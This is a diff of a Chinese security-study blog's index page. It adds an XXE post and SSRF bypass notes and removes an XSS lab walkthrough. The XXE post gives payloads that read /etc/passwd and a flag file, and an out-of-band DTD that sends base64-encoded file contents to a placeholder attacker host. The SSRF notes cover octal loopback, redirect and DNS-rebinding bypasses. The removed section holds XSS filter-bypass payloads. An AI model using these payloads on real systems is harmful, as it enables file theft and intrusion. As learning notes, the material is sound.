@@ -73,6 +73,74 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-XXE" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/03/12/XXE/" class="article-date">
+  <time class="dt-published" datetime="2024-03-12T07:05:24.000Z" itemprop="datePublished">2024-03-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/03/12/XXE/">XXE</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>XML</strong></p>
+<p>XML即 可扩展标记语言（EXtensible Markup Language），是一种标记语言，其标签没有预定义，需要自行定义标签，其于HTML的区别是：</p>
+<ul>
+<li>HTML 被设计用来显示数据</li>
+<li>XML 被设计用来传输和存储数据</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XML声明--&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--DTD，这部分可选的--&gt;          </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">    &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--文档元素--&gt;                                                                          </span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>DTD</strong></p>
+<p>用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用) </p>
+<p>DTD一般认为有两种引用或声明方式：</p>
+<ul>
+<li>1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。</li>
+<li>2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。 外部引用可支持http，file等协议</li>
+</ul>
+<p><strong>外部实体注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">任意文件读取</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;file:///flag&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;rabbit;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">引入外部参数实体</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;http://vps-ip/hack.dtd&quot;&gt;</span><br><span class="line">    %file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;test&gt;&amp;hhh;&lt;/test&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY hhh SYSTEM &#x27;file:///etc/passwd&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">无回显</span><br><span class="line">先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。</span><br><span class="line">&lt;!DOCTYPE updateProfile [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./target.php&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % all</span><br><span class="line">    &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxx.xxx.xxx/?data=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br><span class="line">注意解码</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">通过引入服务器文件</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">	&lt;!ENTITY % remote SYSTEM &quot;http://blog.szfszf.top/xml.dtd&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">	%remote;</span><br><span class="line">	%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;1234&lt;/message&gt;</span><br><span class="line"></span><br><span class="line">xml.dtd</span><br><span class="line"></span><br><span class="line">&lt;!-- xml.dtd --&gt;</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%start;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>绕过</strong></p>
+<ol>
+<li>system等被过滤，使用编码绕过</li>
+<li>http被过滤-&gt;使用伪协议+文件上传</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/03/12/XXE/" data-id="clto5uld50000twb5cu721t2l" data-title="XXE" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-ssrf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/03/07/ssrf/" class="article-date">
@@ -110,11 +178,21 @@
 <p>那么为什么要用gophr伪协议而不用get&#x2F;post呢？其原因为很多时候不能直接get到内网区域，但是可以通过有ssrf漏洞的地方使用该伪协议提交数据</p>
 <p>但是，以get举例，其必须要有特定的头部信息，比如路径和目标ip地址，使用协议时需要注意构造并且url编码一次，注意ip地址后面需要有端口号，在HTTP包最后要加%0d%0a代表消息结束</p>
 <p>如果使用burp发包，要url编码两次（浏览器会自带一次编码）</p>
+<hr>
+<p>接下来是一些绕过方式</p>
+<p><strong>环回地址绕过</strong></p>
+<p>简单来说就是将地址127.0.0.1运用进制转换防止被限制</p>
+<p>比如变成017700000001（第一个0指八进制）</p>
+<p><strong>重定向绕过</strong></p>
+<p>url指向一个公网地址，该地址通过302重定向的方式指向内网ip，来绕过服务器对于访问地址有所限制的情况</p>
+<p><strong>DNS重绑定绕过</strong></p>
+<p>为了预防上面的重定向绕过，服务器会在接收url之后获取该url内部指向的地址，并对该地址进行检查是否为内网ip</p>
+<p>针对这种防御方式，先使目标地址指向一个公网ip，通过检查，再修改指向地址，利用服务器两次解析地址的短暂间隙，更换目标ip来绕过，不过这个方式会有一定概率不会成功，需要多次尝试</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/07/ssrf/" data-id="clth90jg6000c1wb5d8e14ecz" data-title="ssrf" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/07/ssrf/" data-id="clto5uldc000ctwb525y66kr8" data-title="ssrf" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -259,7 +337,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/05/%E5%8E%9F%E7%94%9F%E7%B1%BB/" data-id="clth90jga000l1wb51bljdgke" data-title="原生类" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/05/%E5%8E%9F%E7%94%9F%E7%B1%BB/" data-id="clto5uldh000mtwb53j5573d1" data-title="原生类" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -315,7 +393,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/04/phototype-1/" data-id="clth90jg000001wb5aaol91o1" data-title="phototype_1" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/04/phototype-1/" data-id="clto5uld90003twb559fqg18b" data-title="phototype_1" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -381,7 +459,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/03/phototype/" data-id="clth90jg400051wb55ob3depg" data-title="phototype" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/03/phototype/" data-id="clto5ulda0005twb569fp8ikl" data-title="phototype" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -477,7 +555,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/03/n-ez-unserilize/" data-id="clth90jg300011wb5dyjn0p7p" data-title="n_ez_unserilize" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/03/n-ez-unserilize/" data-id="clto5uld80001twb589190ssm" data-title="n_ez_unserilize" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -533,7 +611,7 @@ include_once()与include()类似:唯一的区别是如果该文件的代码已�
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="clth90jg8000j1wb52lmjgkkb" data-title="文件上传" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="clto5ulde000ktwb5da6cgz6u" data-title="文件上传" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -748,7 +826,7 @@ include_once()与include()类似:唯一的区别是如果该文件的代码已�
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/23/serialize/" data-id="clth90jg500081wb5gygf74w2" data-title="serialize" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/23/serialize/" data-id="clto5uldc000atwb5cyrray6f" data-title="serialize" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -850,7 +928,7 @@ include_once()与include()类似:唯一的区别是如果该文件的代码已�
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/15/upload/" data-id="clth90jg7000d1wb59jiidzvk" data-title="upload" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/15/upload/" data-id="clto5uldd000dtwb5hq0wh3sd" data-title="upload" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -902,75 +980,7 @@ include_once()与include()类似:唯一的区别是如果该文件的代码已�
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/13/xss-11-13/" data-id="clth90jg6000b1wb55s0mbhcv" data-title="xss_11~13" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-xss-7-10" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/02/13/xss-7-10/" class="article-date">
-  <time class="dt-published" datetime="2024-02-13T08:47:46.000Z" itemprop="datePublished">2024-02-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/02/13/xss-7-10/">xss_7~10</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;a&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onblur=&#x27;alert(/1/)&#x27;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(&#x27;a&#x27;)&quot;&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>第七关</strong></p>
-<p>on script href都被过滤，变成空白，双写注入“ oonnblur&#x3D;’alert(&#x2F;1&#x2F;)’”</p>
-<p><strong>第八关</strong></p>
-<p>直接输入，发现输入语句出现在两个地方</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;&lt;scr_ipt&gt;alert(&#x27;a&#x27;)&lt;/scr_ipt&gt;&quot;&gt;友情链接&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;&lt;script&gt;alert(&#x27;a&#x27;)&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>双引号被编码化，无法闭合</p>
-<p>因为内容在标签的属性里面，属性值可以用编码化的方式绕过</p>
-<p>编码：<br>&#x2F;&#x2F; 采用十进制ascii码<br>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#106;&amp;#97;&amp;#100;&amp;#101;&amp;#110;&amp;#34;&amp;#41;<br>&#x2F;&#x2F; 或者十六进制unicode编码<br>&amp;#x006a;&amp;#x0061;&amp;#x0076;&amp;#x0061;&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;&amp;#x003a;&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0022;&amp;#x006a;&amp;#x0061;&amp;#x0064;&amp;#x0065;&amp;#x006e;&amp;#x0022;&amp;#x0029;</p>
-<p><strong>第九关</strong></p>
-<p>&#x2F;，&#x3D;进行了转义，使用绕过的方法无法注释掉后面</p>
-<p>写上一个正确的网址会出现在href属性里</p>
-<p>javascript:alert(“a”)&#x2F;&#x2F;<a target="_blank" rel="noopener" href="http://www.baidu.com/">http://www.baidu.com</a> 但是前面的<br>javascript:alert(“a”) &#x2F;&#x2F; 要进行编码，不然会被加上_</p>
-<p>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#106;&amp;#97;&amp;#100;&amp;#101;&amp;#110;&amp;#34;&amp;#41;&#x2F;&#x2F;<a target="_blank" rel="noopener" href="http://www.baidu.com/">http://www.baidu.com</a></p>
-<p><strong>第十关</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_link&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>get传递</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_link=a&amp;t_history=b&amp;t_sort=c</span><br></pre></td></tr></table></figure>
-
-<p>发现第三个能接收</p>
-<p>“ type&#x3D;’text’ onclick&#x3D;’alert(‘1’)’<br>成功</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/13/xss-7-10/" data-id="clth90jg7000f1wb53gq3384s" data-title="xss_7~10" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/13/xss-11-13/" data-id="clto5uldd000etwb581521a5f" data-title="xss_11~13" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -1032,6 +1042,10 @@ include_once()与include()类似:唯一的区别是如果该文件的代码已�
       <ul>
         
           <li>
+            <a href="/2024/03/12/XXE/">XXE</a>
+          </li>
+        
+          <li>
             <a href="/2024/03/07/ssrf/">ssrf</a>
           </li>
         
@@ -1045,10 +1059,6 @@ include_once()与include()类似:唯一的区别是如果该文件的代码已�
         
           <li>
             <a href="/2024/03/03/phototype/">phototype</a>
-          </li>
-        
-          <li>
-            <a href="/2024/03/03/n-ez-unserilize/">n_ez_unserilize</a>
           </li>
         
       </ul>
